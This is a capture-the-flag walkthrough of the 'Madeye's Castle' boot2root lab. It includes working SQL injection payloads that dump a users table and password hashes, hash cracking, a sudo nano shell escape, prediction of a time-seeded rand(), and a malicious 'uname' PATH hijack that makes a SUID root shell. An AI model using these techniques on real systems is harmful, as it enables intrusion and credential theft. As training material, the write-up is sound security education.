# Madeye's Castle

A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja

Have fun storming Madeye's Castle! In this room you will need to fully enumerate the system, gain a foothold, and then pivot around to a few different users. 

Room: https://tryhackme.com/room/madeyescastle

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/madeyescastle.md

-----------------

## Overview

This machine involved:

* Anonymous SMB enumeration
* Apache virtual-host discovery
* SQLite SQL injection
* SHA-512 password cracking with Hashcat rules
* SSH access
* `sudo` abuse through Pico/Nano
* Predicting a time-seeded random number
* SUID binary exploitation
* `PATH` hijacking for root access

Set the target address:

```bash
export TARGET=MACHINE_IP
```

---

## Initial Enumeration

A full TCP scan identified SSH, HTTP, and SMB:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt \
  "$TARGET"
```

Relevant services:

```text
22/tcp   SSH
80/tcp   Apache HTTP
139/tcp  NetBIOS/SMB
445/tcp  SMB
```

The website on port 80 displayed the standard Apache default page, so SMB was checked next.

---

## SMB Enumeration

Anonymous share enumeration was allowed:

```bash
smbclient -L "//$TARGET" -N
```

After connecting to the accessible share:

```bash
smbclient "//$TARGET/<SHARE_NAME>" -N
```

Two files were available:

```text
spellnames.txt
.notes.txt
```

Download them:

```text
get spellnames.txt
get .notes.txt
```

The hidden note contained two important clues:

```text
Hagrid told me that spell names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

The first line suggested using `rockyou.txt` rather than the provided spell-name wordlist.

The second line hinted at an old terminal text editor, which became relevant later.

---

## Web Enumeration

Directory enumeration identified a backup directory:

```bash
gobuster dir \
  -u "http://$TARGET" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,bak,zip \
  -o gobuster-medium-ext.txt
```

Result:

```text
/backup
```

Browsing to:

```text
http://MACHINE_IP/backup/email
```

revealed an email discussing Apache virtual hosting.

The requested domain was originally `hogwarts-castle.thm`, but the sender stated that the `s` had been changed to a `z`.

The correct virtual host was therefore:

```text
hogwartz-castle.thm
```

Add it to `/etc/hosts`:

```bash
echo "$TARGET hogwartz-castle.thm" |
sudo tee -a /etc/hosts
```

The virtual host presented a login form:

```text
http://hogwartz-castle.thm/
```

---

## SQL Injection

The login form submitted the following parameters:

```text
user
password
```

A basic SQL injection payload in the username field produced a different response:

```text
Username: ' OR 1=1-- -
Password: x
```

Equivalent request:

```bash
curl -s \
  --data-urlencode "user=' OR 1=1-- -" \
  --data-urlencode "password=x" \
  http://hogwartz-castle.thm/login
```

The response confirmed the vulnerability:

```text
The password for Lucas Washington is incorrect!
Congrats on SQL injection... keep digging
```

This showed that the injected query returned a database row, but the application still performed a separate password comparison.

---

## Identifying the Database

SQLMap confirmed that the backend database was SQLite:

```bash
sqlmap \
  -u 'http://hogwartz-castle.thm/login' \
  --data='user=test&password=x' \
  -p user \
  --dbms=SQLite \
  --batch
```

It also determined that the original query returned four columns.

SQLMap struggled to extract the tables because the application returned unusual combinations of HTTP `400`, `403`, and `500` responses, so extraction was completed manually.

---

## Manual UNION Extraction

A four-column `UNION SELECT` was used:

```bash
curl -s \
  --data-urlencode "user=x' AND 1=0 UNION SELECT 'COL1','COL2','COL3','COL4'-- -" \
  --data-urlencode 'password=x' \
  http://hogwartz-castle.thm/login
```

The first selected column was displayed as the account name, while the fourth was included in the application’s error note.

### Table enumeration

```bash
curl -s \
  --data-urlencode "user=x' AND 1=0 UNION SELECT 'DUMP','x',0,(SELECT group_concat(name, ',') FROM sqlite_master WHERE type='table')-- -" \
  --data-urlencode 'password=wrong' \
  http://hogwartz-castle.thm/login
```

This revealed one table:

```text
users
```

### Table schema

```bash
curl -s \
  --data-urlencode "user=x' AND 1=0 UNION SELECT 'DUMP','x',0,(SELECT sql FROM sqlite_master WHERE name='users')-- -" \
  --data-urlencode 'password=wrong' \
  http://hogwartz-castle.thm/login
```

Schema:

```sql
CREATE TABLE users(
    name text not null,
    password text not null,
    admin int not null,
    notes text not null
)
```

### Dumping the notes

```bash
curl -s \
  --data-urlencode "user=x' AND 1=0 UNION SELECT 'DUMP','x',0,(SELECT group_concat(notes, ' | ') FROM users)-- -" \
  --data-urlencode 'password=wrong' \
  http://hogwartz-castle.thm/login
```

One account contained a unique note:

```text
My linux username is my first name, and password uses best64
```

The associated user was:

```text
Harry Turner
```

The note indicated that:

* The Linux username was `harry`
* The password hash should be cracked using Hashcat’s `best64` rule

The account and hash could be retrieved directly:

```bash
curl -s \
  --data-urlencode "user=x' AND 1=0 UNION SELECT (SELECT name FROM users WHERE instr(notes,'best64')>0),'x',0,(SELECT password FROM users WHERE instr(notes,'best64')>0)-- -" \
  --data-urlencode 'password=wrong' \
  http://hogwartz-castle.thm/login
```

---

## Password Cracking

The extracted hash was 128 hexadecimal characters long, indicating raw SHA-512.

Save it:

```bash
echo '<REDACTED_SHA512_HASH>' > harry.hash
```

Use Hashcat mode `1700` with `rockyou.txt` and the `best64` rule:

```bash
hashcat -m 1700 -a 0 \
  harry.hash \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

On some installations, the rule may instead be located at:

```text
/usr/local/hashcat/rules/best64.rule
```

Display the cracked result:

```bash
hashcat -m 1700 harry.hash --show
```

Recovered credentials:

```text
Username: harry
Password: <REDACTED_PASSWORD>
```

---

## SSH Access

Connect using the recovered credentials:

```bash
ssh harry@"$TARGET"
```

Once connected, check `sudo` permissions:

```bash
sudo -l
```

Result:

```text
User harry may run the following commands:
    (hermonine) /usr/bin/pico
```

---

## Harry to Hermonine

The permitted `/usr/bin/pico` command was a symbolic link to Nano:

```bash
file /usr/bin/pico
ls -la /etc/alternatives/pico
```

Result:

```text
/usr/bin/pico -> /etc/alternatives/pico
/etc/alternatives/pico -> /bin/nano
```

Run Pico as `hermonine`:

```bash
sudo -u hermonine /usr/bin/pico
```

Inside the editor:

1. Press `Ctrl+R`
2. Press `Ctrl+X`
3. Enter:

```bash
reset; /bin/bash 1>&0 2>&0
```

4. Press Enter

Verify the new identity:

```bash
whoami
id
```

Result:

```text
hermonine
```

The second user flag was found in the home directory:

```bash
cat ~/user2.txt
```

```text
RME{REDACTED_USER2_FLAG}
```

---

## Privilege-Escalation Enumeration

Search for SUID binaries:

```bash
find / -perm -4000 -type f \
  -printf '%u %g %m %p\n' \
  2>/dev/null
```

A non-standard SUID binary stood out:

```text
/srv/time-turner/swagger
```

Permissions:

```text
-rwsr-xr-x root root /srv/time-turner/swagger
```

Running it produced a number-guessing challenge:

```bash
/srv/time-turner/swagger
```

Example:

```text
Guess my number: 69
Nope, that is not what I was thinking
I was thinking of 1305879739
```

The changing value and the directory name `time-turner` suggested that the random-number generator was seeded with the current time.

---

## Analysing the SUID Binary

Disassembling `main()` showed the following sequence:

```text
time(NULL)
srand()
rand()
scanf()
compare guessed value
call impressive() on success
```

Relevant commands:

```bash
objdump -d -M intel /srv/time-turner/swagger |
sed -n '/<main>:/,/^$/p'
```

The binary effectively performed:

```c
srand(time(NULL));
number = rand();
```

Because both the prediction script and the target used the same version of glibc, the first result from `rand()` could be reproduced using the current Unix timestamp.

---

## Predicting the Random Number

Python’s `ctypes` module can call the system’s glibc implementation directly:

```bash
python3 -c '
import ctypes
import time

libc = ctypes.CDLL("libc.so.6")
libc.srand(int(time.time()))
print(libc.rand())
'
```

Pipe the predicted value directly into the SUID binary so both processes execute during the same second:

```bash
python3 -c 'import ctypes,time; l=ctypes.CDLL("libc.so.6"); l.srand(int(time.time())); print(l.rand())' |
/srv/time-turner/swagger
```

Successful output:

```text
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```

This passed the number check and reached the `impressive()` function.

---

## Discovering the Command Injection

Inspecting the binary’s strings revealed:

```bash
strings -a /srv/time-turner/swagger |
grep -Ei 'uname|architecture|system'
```

Result:

```text
This system architecture is
uname -p
```

The binary called:

```c
system("uname -p");
```

Because `uname` was not referenced using an absolute path, the shell searched the directories listed in the `PATH` environment variable.

This made the root SUID process vulnerable to `PATH` hijacking.

---

## Confirming Root Command Execution

Create a malicious executable named `uname`:

```bash
mkdir -p /tmp/turner

cat > /tmp/turner/uname <<'EOF'
#!/bin/sh
/usr/bin/id > /tmp/turner-id
EOF

chmod +x /tmp/turner/uname
```

Run the binary with `/tmp/turner` at the beginning of `PATH`:

```bash
python3 -c 'import ctypes,time; l=ctypes.CDLL("libc.so.6"); l.srand(int(time.time())); print(l.rand())' |
env PATH=/tmp/turner:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
/srv/time-turner/swagger
```

Check the output file:

```bash
cat /tmp/turner-id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root),1002(hermonine)
```

The malicious `uname` script was being executed as root.

---

## Root Access

Replace the test script with one that creates a SUID copy of Bash:

```bash
cat > /tmp/turner/uname <<'EOF'
#!/bin/sh
/bin/cp /bin/bash /tmp/rootbash
/bin/chown root:root /tmp/rootbash
/bin/chmod 4755 /tmp/rootbash
EOF

chmod +x /tmp/turner/uname
```

Trigger the SUID binary again:

```bash
python3 -c 'import ctypes,time; l=ctypes.CDLL("libc.so.6"); l.srand(int(time.time())); print(l.rand())' |
env PATH=/tmp/turner:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
/srv/time-turner/swagger
```

Verify the new binary:

```bash
ls -l /tmp/rootbash
```

Expected permissions:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Launch Bash while preserving its effective UID:

```bash
/tmp/rootbash -p
```

Verify root access:

```bash
id
```

Then retrieve the root flag:

```bash
cat /root/root.txt
```

```text
RME{REDACTED_ROOT_FLAG}
```

---

## Attack Chain

```text
Anonymous SMB access
    ↓
Hidden notes and wordlist clues
    ↓
Backup email disclosure
    ↓
Apache virtual-host discovery
    ↓
SQLite SQL injection
    ↓
Extract Harry Turner’s SHA-512 hash
    ↓
Hashcat + rockyou.txt + best64.rule
    ↓
SSH as harry
    ↓
sudo Pico/Nano shell escape
    ↓
Shell as hermonine
    ↓
Discover custom SUID binary
    ↓
Predict srand(time(NULL)) output
    ↓
Reach system("uname -p")
    ↓
PATH hijacking
    ↓
Root command execution
    ↓
SUID Bash
    ↓
Root
```

---

## Key Takeaways

### Virtual-host enumeration

A default Apache page does not mean that no application exists. Hostname-based virtual hosts may expose completely different content on the same IP address.

### SQL injection with application-side password validation

A successful SQL injection does not always provide immediate authentication. In this case, the injected query selected a user, but the application separately compared the submitted password against the returned hash.

The SQL injection was instead used to extract the database contents.

### Password-mutation rules

The SMB clue pointed away from the custom spell-name list and toward `rockyou.txt`. The database note then explicitly indicated that Hashcat’s `best64` mutations were required.

### Editor escapes

Allowing a user to execute an interactive editor through `sudo` is dangerous. Nano/Pico can execute commands and provide a shell under the permitted account.

### Predictable randomness

`rand()` is not cryptographically secure. Seeding it with `time(NULL)` makes its output predictable when the approximate execution time is known.

### SUID and `system()`

A SUID-root program should never call external commands through `system()` using unqualified command names.

The vulnerable call:

```c
system("uname -p");
```

should instead have used an absolute path and a sanitised environment, or avoided launching a shell entirely.

